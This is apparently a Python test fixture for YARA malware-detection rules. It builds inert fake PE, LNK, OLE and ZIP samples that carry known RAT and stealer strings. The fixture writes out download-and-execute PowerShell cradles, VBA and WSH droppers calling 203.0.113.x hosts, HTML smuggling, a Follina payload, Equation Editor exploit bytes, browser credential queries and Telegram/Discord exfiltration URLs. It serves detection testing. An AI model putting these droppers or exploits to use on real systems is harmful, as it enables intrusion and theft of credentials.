"""Muestras sintéticas e INERTES para probar las reglas YARA.

Son solo las cadenas/bytes que las reglas buscan, envueltas en cabeceras falsas: un "PE" acá es
"MZ" + puntero a "PE\\0\\0" + texto, sin código ni secciones; no es ejecutable. Ninguna muestra es
malware real. Las IPs son de documentación (RFC 5737: 203.0.113.0/24).
"""

from __future__ import annotations

import base64
import io
import random
import struct
import zipfile


def w(s: str) -> bytes:
    return s.encode("utf-16-le")


def a(s: str) -> bytes:
    return s.encode("utf-8")


def fake_pe(*parts: bytes) -> bytes:
    """Cabecera MZ con e_lfanew -> "PE\\0\\0" y las cadenas separadas por NULs. Inerte.

    El separador es de 4 bytes para que los strings `wide fullword` tengan un vecino no alfanumérico
    también en UTF-16 (como en el heap #US real, donde hay bytes de longitud entre cadenas).
    """
    header = bytearray(0x40)
    header[0:2] = b"MZ"
    struct.pack_into("<I", header, 0x3C, 0x40)
    body = b"PE\x00\x00" + b"\x00" * 0x14
    sep = b"\x00" * 4
    return bytes(header) + body + sep + sep.join(parts) + sep


def fake_lnk(*parts: bytes) -> bytes:
    """Cabecera de acceso directo (ShellLinkHeader, 76 bytes) + cadenas. Inerte."""
    header = b"\x4c\x00\x00\x00" + bytes.fromhex("0114020000000000c000000000000046") + b"\x00" * 56
    return header + b"\x00\x00".join(parts)


def fake_ole(*parts: bytes) -> bytes:
    return bytes.fromhex("d0cf11e0a1b11ae1") + b"\x00" * 504 + b"\x00".join(parts)


def zip_bytes(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return buf.getvalue()


NETSUPPORT_INI = (
    b"0x6ac4f6e1\r\n[Client]\r\n_present=1\r\nDisableClientConnect=1\r\nHideWhenIdle=1\r\nsilent=1\r\n"
    b"SysTray=0\r\n[_License]\r\nquiet=1\r\n[HTTP]\r\nCMPI=60\r\nGatewayAddress=203.0.113.10:443\r\n"
    b"GSK=FL;O=CALBEDAJ@FPBGI:L\r\nPort=443\r\n"
)

PS_CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')"

GULOADER_STAGE = r"""
Function Conglomerate9 ([String]$Herbaceously124)
{
  $Continuum = $Herbaceously124
  For($Sane=5; $Sane -lt $Continuum.Length-1; $Sane+=(6))
  {
    $Imperfect = $Imperfect + $Continuum.Substring($Sane, 1)
  }
  $Imperfect
}
Function Mutarotation04 ([String]$Herbaceously124, $Milieu = 0)
{
  $Frumentum = New-Object byte[] ($Herbaceously124.Length / 2);
  For($Sane=0; $Sane -lt $Herbaceously124.Length; $Sane+=2)
  {  $Frumentum[$Sane/2] = [convert]::ToByte($Herbaceously124.Substring($Sane, 2), 16); }
}
"""

GULOADER_LAUNCHER = (
    'powershell.exe -windowstyle hidden "$Auscultative223=Get-Content '
    "'C:\\Users\\demo\\AppData\\Roaming\\opslag\\Stippled.leg';"
    '$Brontology=$Auscultative223.SubString(50386,3);.$Brontology($Auscultative223)"'
)

SMUGGLING_TEMPLATE = """<html><body><script>
var b64 = "{payload}";
var bin = atob(b64); var arr = new Uint8Array(bin.length);
for (var i = 0; i < bin.length; i++) {{ arr[i] = bin.charCodeAt(i); }}
var blob = new Blob([arr], {{type: "application/octet-stream"}});
var a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "factura.zip";
document.body.appendChild(a); a.click();
</script></body></html>"""


def _enc_ps(cmd: str) -> str:
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


# regla -> muestras que DEBEN dispararla
RULE_SAMPLES: dict[str, list[bytes]] = {
    # ------------------------------------------------------------------ RATs
    "RAT_AsyncRAT": [
        fake_pe(
            w('/c schtasks /create /f /sc onlogon /rl highest /tn "'),
            w("Stub.exe"),
            a("get_ActivatePong"),
            w("vmware"),
            w("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"),
        ),
        # identificadores de la configuración del cliente
        fake_pe(
            a("Ports"),
            a("Hosts"),
            a("Serversignature"),
            a("ServerCertificate"),
            a("Pastebin"),
            a("BDOS"),
            a("Aes256"),
            a("InstallFolder"),
            a("MTX"),
        ),
    ],
    "RAT_DCRat": [
        fake_pe(a("DcRatByqwqdanchun")),
        fake_pe(
            a("havecamera"),
            w("timeout 3 > NUL"),
            w('START "" "'),
            w("L2Mgc2NodGFza3MgL2NyZWF0ZSAvZiAvc2Mgb25sb2dvbiAvcmwgaGlnaGVzdCAvdG4g"),
        ),
    ],
    "RAT_QuasarRAT": [
        fake_pe(
            a("GetKeyloggerLogsResponse"),
            a("DoDownloadAndExecute"),
            w("http://api.ipify.org/"),
            w('" /sc ONLOGON /tr "'),
        )
    ],
    "RAT_njRAT": [
        fake_pe(
            w("|'|'|"),
            w("SEE_MASK_NOZONECHECKS"),
            w("Download ERROR"),
            w('netsh firewall add allowedprogram "'),
        )
    ],
    "RAT_Remcos": [fake_pe(a("Remcos restarted by watchdog!"), a("Mutex_RemWatchdog"))],
    "RAT_XWorm": [fake_pe(w("XWorm V5.6"), a("XLogger"), a("ActivatePong"))],
    "RAT_NanoCore": [fake_pe(a("NanoCore.ClientPluginHost"))],
    "RAT_Warzone_AveMaria": [fake_pe(a("warzone160"), w("Hey I'm Admin"), w("/n:%temp%\\ellocnak.xml"))],
    "RAT_VenomRAT": [fake_pe(w("VenomRATByVenom"))],
    "RAT_NetSupport_Client32_Config": [NETSUPPORT_INI],
    "RAT_NetSupport_Portable_Archive": [
        zip_bytes(
            {
                "soporte/client32.ini": NETSUPPORT_INI,
                "soporte/NSM.LIC": b"[[Enforce]]\r\nlicensee=DEMO\r\nserial_no=NSM000000\r\n",
                "soporte/client32.exe": b"inerte: no es un ejecutable",
                "soporte/PCICL32.DLL": b"inerte",
            }
        )
    ],
    # ------------------------------------------------------------------ stealers
    "Stealer_AgentTesla": [
        fake_pe(
            a("GetMozillaFromLogins"),
            a("KillTorProcess"),
            a("SmtpAccountConfiguration"),
            a("SafariDecryptor"),
            a("TelegramLog"),
        )
    ],
    "Stealer_FormBook": [
        fake_pe(bytes.fromhex("3C30504F5354740940"), bytes.fromhex("E9C59CFFFFC3E80000000058C368")),
    ],
    "Stealer_Lumma": [
        fake_pe(a("TeslaBrowser/5.5"), a("/c2sock")),
        fake_pe(a("- LummaC2 Build: 20230101")),
    ],
    "Stealer_RedLine": [
        fake_pe(a("RedLine.Logic.SQLite")),
        fake_pe(
            a("get_ScannedWallets"),
            a("get_ScanTelegram"),
            a("get_ScanGeckoBrowsersPaths"),
            a("ChromeGetLocalName"),
            a("ScanPasswords"),
            a("GetPrivate3Key"),
        ),
    ],
    "Stealer_Vidar": [fake_pe(a("BinanceChainWallet"), a("CC\\%s_%s.txt"), a("Autofill\\%s_%s.txt"))],
    "Stealer_StealC": [
        fake_pe(w("C:\\builder_v2\\stealc\\json.h")),
        fake_pe(
            a("- Country: ISO?"),
            a("%d/%d/%d %d:%d:%d"),
            a("\\Outlook\\accounts.txt"),
            a("/c timeout /t 5 & del /f /q"),
        ),
    ],
    "Stealer_SnakeKeylogger": [
        fake_pe(
            a("----------------S--------N--------A--------K--------E----------------"), a("SNAKE-KEYLOGGER")
        )
    ],
    "Stealer_Raccoon": [fake_pe(w("\\ffcookies.txt"), w("wallet.dat"), w("0Network\\Cookies"))],
    "Stealer_Rhadamanthys": [
        fake_pe(
            w("TEQUILABOOMBOOM"),
            w(' "%s",Options_RunDLL %s'),
            w("%%TEMP%%\\vcredist_%05x.dll"),
            w("%Systemroot%\\system32\\rundll32.exe"),
        )
    ],
    # ------------------------------------------------------------------ loaders
    "Loader_GuLoader_PowerShell_Launcher": [a(GULOADER_LAUNCHER), w(GULOADER_LAUNCHER)],
    "Loader_GuLoader_PowerShell_Stage": [a(GULOADER_STAGE)],
    "Loader_GuLoader_VB6": [
        fake_pe(a("This program cannot be run under virtual environment or debugging software !"))
    ],
    "Loader_DotNet_Encoded_PE": [
        fake_pe(
            a("mscoree.dll"),
            a("_CorExeMain"),
            a("StrReverse"),
            a("Load"),
            w("AAAAEAAAAMAAQqVT" + "A" * 40),
        )
    ],
    "Loader_Script_Reflective_PE": [
        a(
            '$b = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAA";\r\n'
            "$a = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($b));\r\n"
            "$a.EntryPoint.Invoke($null, $null)\r\n"
        )
    ],
    # ------------------------------------------------------------------ técnicas
    "Technique_Encoded_PE_In_Text": [
        a("var payload = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAA';"),
        a('Dim s: s = StrReverse("AAAAAAAAAAAAAAQAAAAAAAAAAAgLAA8//AAAAEAAAAMAAQqVT")'),
        base64.b64encode(b"XYZ" + b"This program cannot be run in DOS mode.\r\r\n$" + b"\x00" * 8),
        w(base64.b64encode(b"Q" + b"This program cannot be run in DOS mode.").decode()),
        a("[Byte[]] $b = 77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0"),
        a("payload = '4d5a90000300000004000000ffff0000b8000000'"),
    ],
    "Technique_PowerShell_Download_Cradle": [
        a(PS_CRADLE),
        w(PS_CRADLE),
        a(
            "Invoke-WebRequest -Uri https://203.0.113.5/x.exe -OutFile $env:TEMP\\x.exe; Start-Process $env:TEMP\\x.exe"
        ),
        a("powershell -nop -w hidden -enc " + _enc_ps(PS_CRADLE)),
    ],
    "Technique_VBA_AutoExec_Downloader": [
        a(
            'Attribute VB_Name = "ThisDocument"\r\n'
            "Sub AutoOpen()\r\n"
            '    Set x = CreateObject("MSXML2.XMLHTTP")\r\n'
            '    x.Open "GET", "http://203.0.113.7/f.exe", False\r\n'
            "    x.Send\r\n"
            '    Shell "C:\\Users\\Public\\f.exe", vbHide\r\n'
            "End Sub\r\n"
        )
    ],
    "Technique_WSH_Script_Dropper": [
        a(
            'var x = new ActiveXObject("MSXML2.XMLHTTP"); x.open("GET", "http://203.0.113.8/p.exe", false); x.send();\n'
            'var s = new ActiveXObject("ADODB.Stream"); s.Open(); s.Type = 1; s.Write(x.responseBody);\n'
            's.SaveToFile("C:\\\\Users\\\\Public\\\\p.exe", 2);\n'
            'var sh = new ActiveXObject("WScript.Shell"); sh.Run("C:\\\\Users\\\\Public\\\\p.exe", 0);\n'
        ),
        a(
            'Set sh = CreateObject("WScript.Shell")\r\n'
            'sh.Run "powershell -nop -w hidden -ep bypass -c iex(irm https://203.0.113.9/a)", 0\r\n'
        ),
    ],
    "Technique_LNK_LOLBin_Launcher": [
        fake_lnk(
            w("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
            w(" -nop -w hidden -c iex(iwr http://203.0.113.9/a)"),
        ),
        fake_lnk(a("C:\\Windows\\System32\\cmd.exe"), w("/c start /min mshta https://203.0.113.9/x.hta")),
    ],
    "Technique_HTA_ActiveX": [
        a(
            '<html><head><HTA:APPLICATION ID="app" WINDOWSTATE="minimize"></head>\n'
            '<script language="VBScript">\nSet s = CreateObject("WScript.Shell")\ns.Run "calc.exe", 0\n'
            "</script></html>"
        )
    ],
    "Technique_HTML_Smuggling_Payload": [
        a(SMUGGLING_TEMPLATE.format(payload="UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAAAAAA")),
        a(SMUGGLING_TEMPLATE.format(payload="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA")),
    ],
    "Technique_HTML_Smuggling_Generic": [a(SMUGGLING_TEMPLATE.format(payload="SG9sYSBtdW5kbw=="))],
    "Exploit_Follina_MSDT": [
        a(
            '<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param '
            '\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(calc)i/../../x.exe\\""; '
            "</script>" + "A" * 4096
        )
    ],
    "Technique_Office_Remote_Template": [
        a(
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n<Relationships '
            'xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId996" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
            'Target="http://203.0.113.10/index.html!" TargetMode="External"/></Relationships>'
        ),
        a(
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n<Relationships '
            'xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="https://203.0.113.11/plantilla.dotm" TargetMode="External"/></Relationships>'
        ),
    ],
    "Exploit_CVE_2017_11882_Equation_Editor": [
        fake_ole(
            w("Equation Native"),
            bytes.fromhex("1c000000020000000000"),
            bytes.fromhex("0a01085a5a")
            + b"cmd.exe /c calc.exe &AAAAAAAAAAAAAAAAAAAAAAAA"
            + bytes.fromhex("120c4300"),
        ),
        a(
            "{\\rtf1\\ansi{\\object\\objemb{\\*\\objclass Equation.3}\\objw380\\objh260{\\*\\objdata "
            "010500000200000008000000"
            + b"Equation.3".hex()
            + "0000000000000000000e0000"
            + "1c0000000200a5c40000000000"
            + "0a01085a5a"
            + b"cmd.exe /c calc".hex()
            + "120c4300"
            + "}}}"
        ),
    ],
    "Technique_Browser_Credential_Theft": [
        fake_pe(
            a("SELECT origin_url, username_value, password_value FROM logins"),
            a("encrypted_key"),
            w("\\Google\\Chrome\\User Data"),
            w("\\Microsoft\\Edge\\User Data"),
            w("\\BraveSoftware\\Brave-Browser\\User Data"),
            a("Login Data"),
            a("Local State"),
        )
    ],
    "Technique_Telegram_Bot_Exfil": [
        fake_pe(w("https://api.telegram.org/bot123456:AAAAAAAA/sendDocument"), w("chat_id"))
    ],
    "Technique_Discord_Webhook_Exfil": [
        fake_pe(a("https://discord.com/api/webhooks/123456789012345678/abcdef"))
    ],
}


# archivos legítimos o neutros que NO deben disparar ninguna regla
BENIGN_SAMPLES: dict[str, bytes] = {
    "lorem": (
        "Estimado cliente: adjuntamos la factura correspondiente al mes de septiembre. Lorem ipsum dolor "
        "sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna "
        "aliqua. Saludos cordiales, Administración."
    ).encode(),
    "minimal_pdf": (
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>"
        b"endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
    ),
    "ps_admin_script": (
        "# Reinicia la cola de impresión y limpia logs viejos\r\n"
        '$ErrorActionPreference = "Stop"\r\n'
        "Get-Service -Name Spooler | Stop-Service -Force\r\n"
        'Remove-Item -Path "C:\\Windows\\System32\\spool\\PRINTERS\\*" -Force\r\n'
        "Start-Service -Name Spooler\r\n"
        "Get-ChildItem C:\\Logs -Filter *.log | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } "
        "| Remove-Item\r\n"
        'Write-Host "Listo"\r\n'
    ).encode(),
    "ps_download_only": (
        b"# Descarga el reporte diario (no ejecuta nada)\r\n"
        b"Invoke-WebRequest -Uri https://reportes.example.com/diario.csv -OutFile C:\\Reportes\\diario.csv\r\n"
        b"Import-Csv C:\\Reportes\\diario.csv | Measure-Object\r\n"
    ),
    "vbs_logon_script": (
        b'Set net = CreateObject("WScript.Network")\r\n'
        b'net.MapNetworkDrive "Z:", "\\\\servidor\\compartido"\r\n'
        b'WScript.Echo "Unidad conectada"\r\n'
    ),
    "html_newsletter": (
        b"<!DOCTYPE html><html><head><title>Novedades</title>"
        b'<script src="https://www.googletagmanager.com/gtag/js?id=G-XXXX"></script></head>'
        b'<body><h1>Ofertas de octubre</h1><a href="https://tienda.example.com/ofertas">Ver ofertas</a>'
        b'<form action="https://tienda.example.com/suscribir"><input name="email"></form></body></html>'
    ),
    "html_csv_export": (
        b"<html><body><script>function exportar(){ var csv = 'a,b\\n1,2';"
        b"var blob = new Blob([csv], {type: 'text/csv'}); var a = document.createElement('a');"
        b"a.href = URL.createObjectURL(blob); a.download = 'reporte.csv'; a.click(); }</script></body></html>"
    ),
    "ini_file": b"[General]\r\nNombre=Sucursal Centro\r\nPuerto=8080\r\n[HTTP]\r\nProxy=no\r\n",
    "csv": b"fecha,cliente,importe\n2026-09-01,ACME,1000\n2026-09-02,Globex,2500\n",
    "json": b'{"pedido": 1234, "items": [{"sku": "A1", "cantidad": 2}], "total": 99.5}',
    "benign_pe": fake_pe(
        a("kernel32.dll"), a("GetProcAddress"), a("mscoree.dll"), a("_CorExeMain"), w("Hola mundo"), a("Load")
    ),
    "benign_pe_with_urls": fake_pe(a("https://www.example.com/update"), w("Software\\Example\\Settings")),
    "office_rels_internal": (
        b'<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/'
        b'package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
        b'officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId2" '
        b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
        b'Target="https://www.example.com/" TargetMode="External"/></Relationships>'
    ),
    # plantilla corporativa en SharePoint por HTTPS: legítima y muy común
    "office_rels_sharepoint_template": (
        b'<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/'
        b'package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
        b'officeDocument/2006/relationships/attachedTemplate" '
        b'Target="https://empresa.sharepoint.com/sites/plantillas/Membrete.dotx" TargetMode="External"/>'
        b"</Relationships>"
    ),
    "rtf_plain": b"{\\rtf1\\ansi\\deff0 {\\fonttbl {\\f0 Arial;}} Hola, adjunto la cotizacion.}",
    "ole_with_equation": fake_ole(w("Equation Native"), a("Microsoft Equation 3.0"), a("x = y + 2")),
    "lnk_benign": fake_lnk(w("C:\\Program Files\\Contabilidad\\conta.exe"), w("--perfil empresa")),
    "zip_benign": zip_bytes({"factura.pdf": b"%PDF-1.4 inerte", "detalle.csv": b"a,b\n1,2\n"}),
    "random_bytes": random.Random(1234).randbytes(64 * 1024),  # noqa: S311 - datos de prueba
    "utf16_text": w("Reunión del lunes: revisar presupuesto y stock de la sucursal."),
}
